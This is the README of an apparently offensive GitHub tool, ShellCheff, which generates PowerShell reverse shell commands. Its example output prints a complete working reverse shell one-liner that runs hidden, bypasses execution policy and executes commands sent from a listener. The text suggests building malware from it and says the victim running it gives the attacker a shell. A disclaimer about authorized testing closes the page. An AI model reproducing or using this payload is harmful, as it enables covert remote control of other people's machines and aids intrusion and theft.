# ShellCheff
A tool that quickly generates PowerShell Reverse Shell commands to get remote access FAST, incredibly FAST.

# Installation

Clone the repository :
```bash
https://github.com/Alperosci/ShellCheff.git
cd ShellCheff
```

Run the installation file:
```bash
chmod +x install.sh
./install.sh
```

# Usage

This is all flags and usages in tool:
```
usage: ShellCheff [-h] [-v] [-i IP] [-p PORT]

A program that allows you to make ReverseShell attacks FAST, incredibly FAST

options:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  -i IP, --ip IP        Listener IP
  -p PORT, --port PORT  Listener PORT
```

## Example Usage
```
ShellCheff -i 127.0.0.0 -p 4444
 ____   _            _  _   ____  _             __   __ 
/ ___| | |__    ___ | || | / ___|| |__    ___  / _| / _|
\___ \ | '_ \  / _ \| || || |    | '_ \  / _ \| |_ | |_ 
 ___) || | | ||  __/| || || |___ | | | ||  __/|  _||  _|
|____/ |_| |_| \___||_||_| \____||_| |_| \___||_|  |_|  
                                                        

powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client=New-Object System.Net.Sockets.TCPClient('127.0.0.0',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=iex $data 2>&1 | Out-String;$sendback2=$sendback+'PS>'; $sendbyte=[Text.Encoding]::ASCII.GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"

            ^
            |
Use this command in Powershell (or you can create a malware) to get powershell SHELL

Creating listener

Listening on 0.0.0.0 4444
```

When the victim runs the payload, you will get a PowerShell session on their machine.

# Legal Notice / Disclaimer

This tool is developed for educational and authorized penetration testing purposes only.

Unauthorized use of this software against systems or networks without explicit permission is illegal and punishable by law.

By using this tool, you agree to take full responsibility for your actions and ensure that you have proper authorization before performing any security testing or exploitation.

The author is not responsible for any misuse or damage caused by this software.
